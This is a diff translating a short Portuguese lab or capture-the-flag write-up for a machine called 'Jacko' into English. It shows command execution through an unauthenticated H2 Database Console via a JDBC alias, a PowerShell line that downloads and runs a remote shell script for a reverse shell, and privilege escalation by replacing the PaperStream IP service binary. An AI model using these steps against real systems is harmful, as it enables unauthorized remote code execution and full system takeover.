@@ -1,38 +1,38 @@
 # Jacko
 > H2 Database + PaperStream
 
-## Enumeração
+## Enumeration
 
 ```
 nmap -sC -sV -oN nmap.txt <IP>
 ```
 
-Porta 8082 com H2 Database Console acessível.
+Port 8082 with accessible H2 Database Console.
 
-## Exploração
+## Exploitation
 
-H2 Console sem autenticação. Execução de comandos via JDBC:
+H2 Console with no authentication. Command execution via JDBC:
 
 ```
 CREATE ALIAS EXEC AS $$ String exec(String cmd) throws Exception { Runtime rt = Runtime.getRuntime(); String[] commands = {"cmd.exe", "/c", cmd}; Process proc = rt.exec(commands); return "done"; } $$;
 CALL EXEC('powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<IP>/shell.ps1'')"');
 ```
 
-Reverse shell obtido.
+Reverse shell obtained.
 
-## Escalada de Privilégio
+## Privilege Escalation
 
-PaperStream IP instalado. Versão vulnerável a escalada local:
+PaperStream IP installed. Version vulnerable to local privilege escalation:
 
 ```
 .\winPEAS.exe
 ```
 
 ```
-# explorar serviço PaperStream com permissão de escrita
+# exploit PaperStream service with write permission
 sc stop PaperStream
 copy malicious.exe "C:\Program Files\PFU\PaperStream IP\..."
 sc start PaperStream
 ```
 
-SYSTEM obtido.
+SYSTEM obtained.
